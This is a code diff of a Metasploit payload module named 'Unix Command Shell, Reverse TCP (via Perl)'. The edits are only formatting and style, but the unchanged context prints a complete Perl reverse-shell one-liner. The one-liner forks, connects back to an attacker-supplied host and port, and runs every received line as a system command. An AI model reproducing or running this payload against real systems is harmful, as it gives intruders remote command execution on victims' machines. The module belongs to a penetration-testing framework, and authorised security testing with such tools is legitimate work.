@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -9,7 +10,6 @@ require 'msf/base/sessions/command_shell'
 require 'msf/base/sessions/command_shell_options'
 
 module MetasploitModule
-
   CachedSize = 234
 
   include Msf::Payload::Single
@@ -17,29 +17,28 @@ module MetasploitModule
 
   def initialize(info = {})
     super(merge_info(info,
-      'Name'          => 'Unix Command Shell, Reverse TCP (via Perl)',
-      'Description'   => 'Creates an interactive shell via perl',
-      'Author'        => 'cazz',
-      'License'       => BSD_LICENSE,
-      'Platform'      => 'unix',
-      'Arch'          => ARCH_CMD,
-      'Handler'       => Msf::Handler::ReverseTcp,
-      'Session'       => Msf::Sessions::CommandShell,
-      'PayloadType'   => 'cmd',
-      'RequiredCmd'   => 'perl',
-      'Payload'       =>
-        {
-          'Offsets' => { },
-          'Payload' => ''
-        }
-      ))
+                     'Name'          => 'Unix Command Shell, Reverse TCP (via Perl)',
+                     'Description'   => 'Creates an interactive shell via perl',
+                     'Author'        => 'cazz',
+                     'License'       => BSD_LICENSE,
+                     'Platform'      => 'unix',
+                     'Arch'          => ARCH_CMD,
+                     'Handler'       => Msf::Handler::ReverseTcp,
+                     'Session'       => Msf::Sessions::CommandShell,
+                     'PayloadType'   => 'cmd',
+                     'RequiredCmd'   => 'perl',
+                     'Payload'       =>
+                       {
+                         'Offsets' => {},
+                         'Payload' => ''
+                       }))
   end
 
   #
   # Constructs the payload
   #
   def generate
-    return super + command_string
+    super + command_string
   end
 
   #
@@ -51,5 +50,4 @@ module MetasploitModule
     lhost = "[#{lhost}]" if Rex::Socket.is_ipv6?(lhost)
     cmd   = "perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET#{ver}(PeerAddr,\"#{lhost}:#{datastore['LPORT']}\");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};'"
   end
-
 end
